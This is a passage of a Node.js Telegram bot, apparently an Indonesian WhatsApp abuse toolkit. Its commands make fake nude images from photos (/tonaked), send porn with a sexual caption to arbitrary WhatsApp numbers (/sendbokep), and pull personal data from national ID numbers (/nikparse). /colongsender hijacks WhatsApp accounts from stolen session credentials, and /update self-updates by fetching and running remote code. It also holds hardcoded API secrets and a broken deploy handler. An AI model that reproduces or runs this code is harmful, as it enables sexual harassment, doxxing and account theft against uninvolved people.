    botList += "```";
    await bot.sendMessage(chatId, botList, { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
});


// -- ( Case Add Sender ) -- \\
bot.onText(/^\/addsender(?:\s+(.+))?$/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
  if (!isOwner(senderId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❗️ Wrong usage:\n`/addsender 62xxxxxxxxxx`", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
    }
    const botNumber = match[1].replace(/[^0-9]/g, "");
    if (botNumber.length < 10) {
        return bot.sendMessage(chatId, "❗️Invalid number.");
    }
    try {
        await connectToWhatsApp(botNumber, chatId);
    } catch (error) {
        console.error("Error in /addsender:", error);
        bot.sendMessage(chatId, "⚠️ Error connecting to WhatsApp. Please try again.");
    }
});


/// ---- ( Tools Case ) ---- \\\
bot.onText(/^\/tonaked$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  let imageUrl = null;

  // Jika command direply ke foto
  if (msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const file = await bot.getFile(fileId);
    imageUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
  }

  if (!imageUrl) {
    return bot.sendMessage(chatId, '⚠️ Reply ke foto untuk memproses gambar.');
  }

  // Kirim pesan status
  const statusMsg = await bot.sendMessage(chatId, '⏳ Memproses gambar...');

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
    const data = await res.json();
    const hasil = data.result;

    if (!hasil) {
      return bot.editMessageText('❌ Gagal memproses gambar. Pastikan URL atau foto valid.', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    // Hapus pesan status
    await bot.deleteMessage(chatId, statusMsg.message_id);

    // Kirim hasil foto
    await bot.sendPhoto(chatId, hasil, { caption: '✅ Berhasil diproses!' });

  } catch (err) {
    console.error(err);
    await bot.editMessageText('❌ Terjadi kesalahan saat memproses gambar.', {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });
  }
});


// -- ( Konfigurasi ) -- \\
const TOKEN = "8431385072:AAHnczUU5NHjzhIkBh7TmB5ca9b0W_5PAcQ";
const openaiKey = "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";
const openai = new OpenAI({ apiKey: openaiKey });

// -- ( Case /FixCode ) -- \\
bot.onText(/^\/fixcode(.*)/i, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userExplanation = match[1]?.trim() || "(no explanation provided)";

    // Pastikan reply ke pesan lain
    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId,
        "❌ Syntax Error!\n\nGunakan:\n/fixcode <penjelasan>\nBalas ke pesan berisi kode atau file.\n\nContoh:\n/fixcode perbaiki syntax error\n\n© ηєѕ¢яѕνσι∂ ϟ"
      );
    }

    let code = "";
    let filename = "fixed.js";
    let lang = "JavaScript";

    const reply = msg.reply_to_message;

    // === Jika reply file dokumen ===
    if (reply.document) {
      const fileId = reply.document.file_id;
      const file = await bot.getFile(fileId);
      const fileLink = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const response = await axios.get(fileLink);
      code = response.data;
      filename = reply.document.file_name || "fixed.js";

      // Deteksi bahasa dari ekstensi
      if (filename.endsWith(".php")) lang = "PHP";
      else if (filename.endsWith(".py")) lang = "Python";
      else if (filename.endsWith(".html") || filename.endsWith(".htm")) lang = "HTML";
      else if (filename.endsWith(".css")) lang = "CSS";
      else if (filename.endsWith(".json")) lang = "JSON";
      else lang = "JavaScript";

    // === Jika reply text ===
    } else if (reply.text) {
      code = reply.text;
    } else {
      return bot.sendMessage(chatId, "❌ Balas ke pesan teks atau file kode.");
    }

    // === Mulai proses ===
    await bot.sendMessage(chatId, "🛠️ Sedang memperbaiki kode...");

    const completion = await openai.chat.completions.create({
      model: "gpt-4o-mini",
      messages: [
        {
          role: "system",
          content:
            "Kamu hanya boleh memperbaiki error dalam kode dan merapikan format. " +
            "Berikan penjelasan error dan solusi, lalu tampilkan kode hasil perbaikan tanpa code block. " +
            "Format: ANALYSIS:[penjelasan] CODE:[kode hasil]"
        },
        {
          role: "user",
          content:
            userExplanation === "(no explanation provided)"
              ? `Perbaiki error dan rapikan format kode ${lang} ini:\n${code}`
              : `Perbaiki error dan rapikan format kode ${lang} ini berdasarkan penjelasan:\n${code}\n\nPenjelasan:\n${userExplanation}`
        }
      ]
    });

    const result = completion.choices[0].message.content;

    // === Pisahkan ANALYSIS dan CODE ===
    const analysisMatch = result.match(/ANALYSIS:\s*([\s\S]*?)(?=CODE:|$)/i);
    const codeMatch = result.match(/CODE:\s*([\s\S]*?)$/i);
    const explanation = analysisMatch ? analysisMatch[1].trim() : "Tidak ada analisis spesifik.";
    const fixedCode = codeMatch ? codeMatch[1].trim() : result.trim();

    // === Kirim hasil analisis ===
    const header = `
<pre>༑ᐧ 𖣂 νσι∂ 𖣂 ༑ᐧ</pre>
<b>( 🛠️ ) Code Fix Result</b>
<b>Language:</b> ${lang}
<b>User Explanation:</b> ${userExplanation}
<b>Error Analysis:</b>
${explanation}

© 𖣂ѕσ¢ѕυѕнєχα νσι∂ ϟ
`;

    await bot.sendMessage(chatId, header, { parse_mode: "HTML" });

    // === Simpan kode ke file sementara ===
    const tempDir = "./temp";
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    const tempFilePath = `./temp/fixed_${Date.now()}_${filename}`;
    fs.writeFileSync(tempFilePath, fixedCode);

    // === Kirim file hasil ===
    await bot.sendDocument(chatId, tempFilePath, {}, {
      filename: `Fixed_${filename}`
    });

    // === Hapus file sementara ===
    fs.unlinkSync(tempFilePath);

    console.log(chalk.green(`✅ Code fix completed for user ${senderId}`));

  } catch (error) {
    console.error(chalk.red(`❌ Fixcode error: ${error.message}`));
    await bot.sendMessage(msg.chat.id,
      `❌ Failed to fix code: ${error.message}\n\nPlease try again or contact support.`
    );
  }
});


// === Fungsi bantu ===
const streamToBuffer = async (stream) => {
  const chunks = [];
  for await (const chunk of stream) chunks.push(chunk);
  return Buffer.concat(chunks);
};

async function deployToVercel() {
  try {
    const response = await axios.post(
      "https://api.vercel.com/v13/deployments",
      {
        name: "my-vercel-deploy",
        gitSource: {
          type: "github",
          repoId: "xzellxopz/my-project", // Ganti sesuai GitHub repo kamu
        },
      },
      {
        headers: {
          Authorization: `Bearer ${process.env.VERCEL_TOKEN}`,
          "Content-Type": "application/json",
        },
      }
    );

    return `✅ Deploy berhasil!\nURL: ${response.data.url}`;
  } catch (error) {
    console.error(error.response?.data || error.message);
    return `❌ Gagal deploy: ${error.response?.data?.error?.message || error.message}`;
  }
}


// === Command /deployvercel ===
bot.onText(/^\/deployvercel(?:\s+(\S+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;
  const senderId = msg.from.id;
  const domainName = match[1];
  
  // ==== CEK PREMIUM ====
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "🚫 Fitur ini hanya untuk pengguna premium.");
  }

  // ==== CEK REPLY DAN FILE ====
  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(
      chatId,
      "❌ Harap reply pesan yang berisi file HTML dengan perintah ini."
    );
  }

  if (!domainName) {
    return bot.sendMessage(
      chatId,
      "❌ Harap sertakan nama domain. Contoh:\n`/deployvercel mywebsite`",
      { parse_mode: "Markdown" }
    );
  }

  const fileId = msg.reply_to_message.document.file_id;

  try {
    await bot.sendMessage(chatId, "⏳ Sedang memproses deploy ke Vercel...");
   
    // === Dapatkan link file ===
    const result = await deployToVercel();
    bot.sendMessage(chatId, result);
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;

    // === Download file ===
    const response = await axios.get(fileUrl, { responseType: "stream" });
    const content = await streamToBuffer(response.data);
    const contentBase64 = content.toString("base64");

    // === Buat repo GitHub ===
    const repoName = `vercel-${domainName}-${Date.now()}`;
    const githubResponse = await axios.post(
      "https://api.github.com/user/repos",
      {
        name: repoName,
        auto_init: false,
        private: false,
      },
      {
        headers: {
          Authorization: `token ${process.env.GITHUB_TOKEN}`,
          Accept: "application/vnd.github.v3+json",
        },
      }
    );

    await bot.sendMessage(
      chatId,
      `✅ Website berhasil di-deploy ke Vercel!\n\n🌐 Domain: https://${domainName}.vercel.app\n📊 Status: ${vercelResponse.data.status}`
    );
  } catch (error) {
    console.error("Error deploying to Vercel:", error.response?.data || error.message);
    await bot.sendMessage(chatId, "❌ Gagal mendeploy ke Vercel. Silakan coba lagi nanti.");
  }
});

// -- ( send bokep)
const videoList = [
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4",
  "https://files.catbox.moe/zjo5r6.mp4",
  "https://files.catbox.moe/7i6amv.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4",
  "https://files.catbox.moe/fxe94h.mp4",
  "https://files.catbox.moe/52oh63.mp4",
  "https://files.catbox.moe/ite58a.mp4",
  "https://files.catbox.moe/svw26n.mp4",
  "https://files.catbox.moe/bv5yaa.mp4",
  "https://files.catbox.moe/ozk5xr.mp4",
  "https://files.catbox.moe/926k9a.mp4"
];
let lastVideoIndex = -1;

function pickRandomVideo() {
  let randomIndex;
  do {
    randomIndex = Math.floor(Math.random() * videoList.length);
  } while (videoList.length > 1 && randomIndex === lastVideoIndex);
  lastVideoIndex = randomIndex;
  return videoList[randomIndex];
}

bot.onText(/\/sendbokep\s+(\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/\D/g, '');
    const targetJid = `${formattedNumber}@s.whatsapp.net`;

    console.log(`[INFO] Menerima perintah /sendbokep dari ${chatId} ke ${formattedNumber}`);

    if (waConnectionStatus !== 'connected' || !waSocket) {
      bot.sendMessage(chatId, "🙈 Gagal: Bot WhatsApp tidak sedang terhubung. Silakan tunggu atau hubungkan ulang.");
      return;
    }
    
    let sentMessage;
    try {
      sentMessage = await bot.sendMessage(chatId, `
\`\`\`
# PROSES KIRIM
- Target WA : ${formattedNumber}
- Status     : Mengecek nomor...
\`\`\`
      `, { parse_mode: "Markdown" });

      const [exists] = await waSocket.onWhatsApp(targetJid);
      if (!exists || !exists.exists) {
        await bot.editMessageText(`
\`\`\`
# GAGAL KIRIM
- Target WA : ${formattedNumber}
- Status     : Nomor tidak terdaftar di WhatsApp.
\`\`\`
        `, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown"
        });
        return;
      }
      
      await bot.editMessageText(`
\`\`\`
# PROSES KIRIM
- Target WA : ${formattedNumber}
- Status     : Mengirim video...
\`\`\`
      `, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown"
      });

      const randomVideoUrl = pickRandomVideo();
      const caption = "ADUH BANG.. NGENTOT TAN YUK... NANTI YANG KENCENG BANGET!..";
      
      await waSocket.sendMessage(targetJid, {
        video: { url: randomVideoUrl },
        caption: caption
      });

      await bot.editMessageText(`
\`\`\`
# SUKSES KIRIM
- Target WA : ${formattedNumber}
- Status     : Berhasil terkirim!
\`\`\`
      `, {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown"
      });

    } catch (error) {
      console.error('[ERROR] Gagal mengirim video:', error);
      if (sentMessage) {
        await bot.editMessageText(`
\`\`\`
# GAGAL KIRIM
- Target WA : ${formattedNumber}
- Status     : Error ${error.message}
\`\`\`
        `, {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown"
        });
      }
    }
  });
  
  bot.onText(/\/sendbokep$/, (msg) => {
    bot.sendMessage(msg.chat.id, 'Format salah. Gunakan: /sendbokep <nomorhp>');
  });

// -- ( case nik perse )
bot.onText(/\/nikparse(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const nik = match[1].trim();

  // Validasi input
  if (!nik) {
    return bot.sendMessage(chatId, "🪧 Format: /nikparse 1234567890283625");
  }

  if (!/^\d{16}$/.test(nik)) {
    return bot.sendMessage(chatId, "❌ ☇ NIK harus 16 digit angka");
  }

  // Kirim pesan menunggu
  const waitMsg = await bot.sendMessage(chatId, "⏳ ☇ Sedang memproses pengecekan NIK...");

  // Fungsi buat format hasil
  const replyHTML = async (d) => {
    const get = (x) => x ?? "-";
    const caption = `
<blockquote><b>｢ ⸸ ｣ Majèsty's ↯ Võcius ♰ </b></blockquote>
⌑ NIK: ${get(d.nik) || nik}
⌑ Nama: ${get(d.nama)}
⌑ Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
⌑ Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
⌑ Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
⌑ Umur: ${get(d.umur)}
⌑ Provinsi: ${get(d.provinsi || d.province)}
⌑ Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
⌑ Kecamatan: ${get(d.kecamatan || d.district)}
⌑ Kelurahan/Desa: ${get(d.kelurahan || d.village)}
    `;

    await bot.sendMessage(chatId, caption, { parse_mode: "HTML", disable_web_page_preview: true });
  };

  // === Mulai proses cek NIK ===
  try {
    const a1 = await axios.get(`https://api.akuari.my.id/national/nik?nik=${nik}`, {
      headers: { "user-agent": "Mozilla/5.0" },
      timeout: 15000,
    });

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(`https://api.nikparser.com/nik/${nik}`, {
        headers: { "user-agent": "Mozilla/5.0" },
        timeout: 15000,
      });
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (err) {
    try {
      const a2 = await axios.get(`https://api.nikparser.com/nik/${nik}`, {
        headers: { "user-agent": "Mozilla/5.0" },
        timeout: 15000,
      });
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi API, coba lagi nanti");
      }
    } catch {
      await bot.sendMessage(chatId, "❌ ☇ Gagal menghubungi API, coba lagi nanti");
    }
  } finally {
    // Hapus pesan "menunggu"
    try {
      await bot.deleteMessage(chatId, waitMsg.message_id);
    } catch (e) {}
  }
});


// -- ( Case Enc Html ) 
bot.onText(/\/enchtml/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek apakah user reply ke file .html
  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ Silakan reply ke file .html yang ingin dienkripsi.");
  }

  const document = msg.reply_to_message.document;

  // Pastikan ekstensi file .html
  if (!document.file_name.endsWith(".html")) {
    return bot.sendMessage(chatId, "❌ File harus berekstensi .html!");
  }

  try {
    // Ambil file dari Telegram
    const fileId = document.file_id;
    const file = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${TOKEN_BOT}/${file.file_path}`;

    // Download isi file HTML
    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = Buffer.from(response.data).toString("utf8");

    // Encode ke Base64
    const encoded = Buffer.from(htmlContent, "utf8").toString("base64");

    // Template hasil enkripsi
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Vero.Vrl</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    // Simpan hasilnya
    const outputPath = path.join(__dirname, "encbyrazx.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    // Kirim balik file ke user
    await bot.sendDocument(chatId, outputPath, {
      caption: "✅ Enc Html By Hexa (🍁)",
    });

    // Hapus file setelah dikirim
    fs.unlinkSync(outputPath);
  } catch (error) {
    console.error("Error saat enkripsi:", error);
    bot.sendMessage(chatId, "❌ Terjadi error saat membuat file terenkripsi.");
  }
});


bot.onText(/^\/colongsender$/i, async (msg) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah user adalah owner
    if (!isOwner(senderId)) {
        return bot.sendMessage(chatId, '❌ Khusus owner we.');
    }

    // Cek apakah membalas document
    const doc = msg.reply_to_message?.document;
    if (!doc) {
        return bot.sendMessage(chatId, '❌ Balas file session atau creds.json dengan /colongsender');
    }

    const name = doc.file_name.toLowerCase();

    // Validasi ekstensi file
    const allowedExts = ['.json', '.zip', '.tar', '.tar.gz', '.tgz'];
    if (!allowedExts.some(ext => name.endsWith(ext))) {
        return bot.sendMessage(chatId, '❌ File bukan session tolol.');
    }

    const processingMsg = await bot.sendMessage(chatId, '🔄 Proses colong sender in you session…');

    try {
        // Download file
        const url = await bot.getFileLink(doc.file_id);
        const { data } = await axios.get(url, { responseType: 'arraybuffer' });

        // Buat temporary directory
        const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

        // Extract file berdasarkan tipe
        if (name.endsWith('.json')) {
            await fs.writeFile(path.join(tmp, 'creds.json'), data);
        } else if (name.endsWith('.zip')) {
            const AdmZip = require('adm-zip');
            new AdmZip(Buffer.from(data)).extractAllTo(tmp, true);
        } else {
            const tmpTar = path.join(tmp, name);
            await fs.writeFile(tmpTar, data);
            await tar.x({ file: tmpTar, cwd: tmp });
            await fs.rm(tmpTar, { recursive: true, force: true });
        }

        // Cari file creds.json
        const credsPath = await findCredsFile(tmp);
        if (!credsPath) {
            await fs.rm(tmp, { recursive: true, force: true });
            return bot.editMessageText('❌ creds.json tidak ditemukan bego', {
                chat_id: chatId,
                message_id: processingMsg.message_id
            });
        }

        // Baca creds.json untuk mendapatkan nomor bot
        const creds = JSON.parse(await fs.readFile(credsPath, 'utf8'));
        const botNumber = creds.me?.id?.split(':')[0];

        if (!botNumber) {
            await fs.rm(tmp, { recursive: true, force: true });
            return bot.editMessageText('❌ Format creds.json tidak valid', {
                chat_id: chatId,
                message_id: processingMsg.message_id
            });
        }

        // Siapkan directory tujuan
        const destDir = createSessionDir(botNumber);

        // Hapus session lama jika ada, lalu copy yang baru
        await fs.rm(destDir, { recursive: true, force: true });
        await fs.copy(tmp, destDir);

        // Simpan ke active sessions
        saveActiveSessions(botNumber);

        // Connect ke WhatsApp
        const { state, saveCreds } = await useMultiFileAuthState(destDir);

        sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: P({ level: "silent" }),
            defaultQueryTimeoutMs: undefined,
        });

        // Setup event handlers
        sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;

            if (connection === "open") {
                sessions.set(botNumber, sock);
                await bot.editMessageText(`✅ Session ${botNumber} done maling sendernya bre 😈🤭.`, {
                    chat_id: chatId,
                    message_id: processingMsg.message_id
                });
            } else if (connection === "close") {
                const statusCode = lastDisconnect?.error?.output?.statusCode;
                if (statusCode && statusCode >= 500 && statusCode < 600) {
                    await bot.editMessageText(`❌ Gagal connect ${botNumber}, coba lagi nanti.`, {
                        chat_id: chatId,
                        message_id: processingMsg.message_id
                    });
                } else {
                    await bot.editMessageText(`❌ Session ${botNumber} invalid atau sudah logout.`, {
                        chat_id: chatId,
                        message_id: processingMsg.message_id
                    });
                    try {
                        await fs.rm(destDir, { recursive: true, force: true });
                    } catch (error) {
                        console.error("Error deleting session:", error);
                    }
                }
            }
        });

        sock.ev.on("creds.update", saveCreds);

        // Bersihkan temporary files
        await fs.rm(tmp, { recursive: true, force: true });

    } catch (error) {
        console.error('Error in colongsender:', error);
        await bot.editMessageText(`❌ Error: ${error.message}`, {
            chat_id: chatId,
            message_id: processingMsg.message_id
        });
    }
});


bot.onText(/^\/trackip(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Hanya owner.')
  try {
    if (!match[1]) {
      return bot.sendMessage(chatId, "ip nya mana dongo", {
        reply_to_message_id: msg.message_id,
      });
    }
    const res = await axios.get(`https://ipwhois.app/json/${match[1]}`);
    const d = res.data;
    await bot.sendMessage(chatId, "```json\n" + JSON.stringify(d, null, 2) + "```", {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      });
  } catch (err) {
    bot.sendMessage(chatId, err.message, {
      reply_to_message_id: msg.message_id,
    });
  }
});

bot.onText(/^\/autoupdate (on|off)$/i, (msg, match) => {
    const chatId = msg.chat.id;
    const option = match[1].toLowerCase();

    config.autoUpdate = option === "on";
    saveConfig(config);

    bot.sendMessage(
        chatId,
        `⚙️ AutoUpdate sekarang: *${config.autoUpdate ? "ON ✅" : "OFF ❌"}*`,
        { parse_mode: "Markdown" }
    );
});

bot.onText(/^\/update$/, async (msg) => {
    const chatId = msg.chat.id;

    bot.sendMessage(chatId, "🔄 Mengambil new update brok");

    try {
        const response = await axios.get(Ghlu);
        const newCode = response.data;
        if (fs.existsSync(Js_Oriii)) {
            fs.unlinkSync(Js_Oriii);
        }

        fs.writeFileSync(Js_Oriii, newCode);

        await bot.sendMessage(chatId, "✅ Selesai Update\n🔁 Bot restart otomatis.");

        setTimeout(() => {
            process.exit(0);
        }, 1000);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal update, Chat Owner Lu.");
    }
});

bot.onText(/\/gethtml (.+)?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const url = match[1];
    
    if (!/^https?:\/\//.test(url)) 
        return bot.sendMessage(chatId, `Example: /gethtml https://seren.tzy.id`, {
        parse_mode: "HTML"
        });

    bot.sendMessage(chatId, `⚡ Proses mengambil file.`, {
    parse_mode: "HTML"
    });

    try {
        const res = await fetch(url);
        const contentLength = parseInt(res.headers.get("content-length") || "0");
        if (contentLength > 100 * 1024 * 1024)
            throw `File terlalu besar: ${contentLength} bytes`;

        const contentType = res.headers.get("content-type") || "";

        if (contentType.startsWith("image/")) {
            return bot.sendPhoto(chatId, url);
        }

        if (contentType.startsWith("video/")) {
            return bot.sendVideo(chatId, url);
        }

        if (contentType.startsWith("audio/")) {
            return bot.sendAudio(chatId, url, { caption: "Audio dari URL" });
        }

        const arrayBuffer = await res.arrayBuffer();
        const buffer = Buffer.from(arrayBuffer);

        if (contentType.includes("text") || contentType.includes("json")) {
            let text = buffer.toString();

            if (text.length > 4096) {
    const htmlContent = text;

    return bot.sendDocument(
        chatId,
        Buffer.from(htmlContent, "utf-8"),
        { caption: "Hasil HTML dari URL" },
        { filename: "seren.html", contentType: "text/html" }
    );
} else {
                return bot.sendMessage(chatId, text);
            }
        } else {
            return bot.sendDocument(
                chatId,
                buffer,
                { caption: "File dari URL" },
                { filename: "file.bin", contentType: contentType || "application/octet-stream" }
            );
        }

    } catch (err) {
        return bot.sendMessage(chatId, `❌ Gagal mengambil file: ` + err);
    }
});


bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});


bot.onText(/\/brat(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a text.\n\nExample:\n/brat Hallo All");
    }

    const text = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}`;

        // langsung kirim gambar dari API
        await bot.sendPhoto(chatId, apiUrl, {
            caption: `🖼️ Brat Image Generated\n\n✏️ Text: *${text}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Brat API Error:", err);
        bot.sendMessage(chatId, "❌ Error generating Brat image. Please try again later.");
    }
});


bot.onText(/\/pinterest(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a search query.\n\nExample:\n/pinterest iPhone 17 Pro Max");
    }

    const query = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result || data.result.length === 0) {
            return bot.sendMessage(chatId, "❌ No Pinterest images found for your query.");
        }

        // Ambil gambar pertama dari hasil
        const firstResult = data.result[0];

        await bot.sendPhoto(chatId, firstResult, {
            caption: `📌 Pinterest Result for: *${query}*`,
            parse_mode: "Markdown"
        });
    } catch (err) {
        console.error("Pinterest API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Pinterest image. Please try again later.");
    }
});


bot.onText(/^\/tourl$/, async (msg) => {
    const chatId = msg.chat.id;      
    if (!msg.reply_to_message || (!msg.reply_to_message.document && !msg.reply_to_message.photo && !msg.reply_to_message.video)) {
        return bot.sendMessage(chatId, "```❌\n❌ Silakan reply sebuah file/foto/video dengan command /tourl```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });
    }
    const repliedMsg = msg.reply_to_message;
    let fileId, fileName;    
    if (repliedMsg.document) {
        fileId = repliedMsg.document.file_id;
        fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
    } else if (repliedMsg.photo) {
        fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
        fileName = `photo_${Date.now()}.jpg`;
    } else if (repliedMsg.video) {
        fileId = repliedMsg.video.file_id;
        fileName = `video_${Date.now()}.mp4`;
    }
    try {        
        const processingMsg = await bot.sendMessage(chatId, "```⌛\n⏳ Mengupload ke Catbox...```", { reply_to_message_id: msg.message_id, parse_mode: "Markdown" });        
        const fileLink = await bot.getFileLink(fileId);
        const response = await axios.get(fileLink, { responseType: 'stream' });
        const FormData = require ("form-data");
        const form = new FormData();
        form.append('reqtype', 'fileupload');
        form.append('fileToUpload', response.data, {
            filename: fileName,
            contentType: response.headers['content-type']
        });
        const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
            headers: form.getHeaders()
        });

        
        await bot.editMessageText(`*✅ Upload berhasil! 📎URL:* \`\`\`🖼️📎\n${catboxUrl}\`\`\``, {
            chat_id: chatId,
            message_id: processingMsg.message_id,
            parse_mode: "Markdown"
        });

    } catch (error) {
        console.error(error);
        bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
    }
});


bot.onText(/^\/iqc (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(
      chatId,
      "⚠ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
